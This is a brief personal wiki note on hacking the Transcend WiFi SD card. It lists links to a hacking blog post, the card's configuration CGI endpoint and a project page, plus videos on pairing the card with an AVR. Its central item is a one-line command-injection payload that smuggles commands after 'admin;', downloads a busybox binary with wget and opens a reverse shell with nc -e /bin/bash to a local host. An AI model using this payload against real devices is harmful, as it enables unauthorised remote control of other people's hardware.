---
title: Transcend WiFi SD
---

* http://haxit.blogspot.ch/2013/08/hacking-transcend-wifi-sd-cards.html
* http://192.168.11.254/cgi-bin/kcard_edit_config_insup.pl
* http://dmitry.gr/index.php?r=05.Projects&proj=15.%20Transcend%20WiFiSD

```bash
admin; wget http://192.168.11.11/busybox-armv5l; chmod a+x /www/cgi-bin/busybox-armv5l; /www/cgi-bin/busybox-armv5l nc 192.168.11.11 1337 -e /bin/bash #
```

==Transcend WiFi in combi met AVR==
* https://www.youtube.com/watch?annotation_id=annotation_1323056153&feature=iv&src_vid=HT4W3CPlnAU&v=-Z9TrZQw16s
* https://www.youtube.com/watch?v=HT4W3CPlnAU
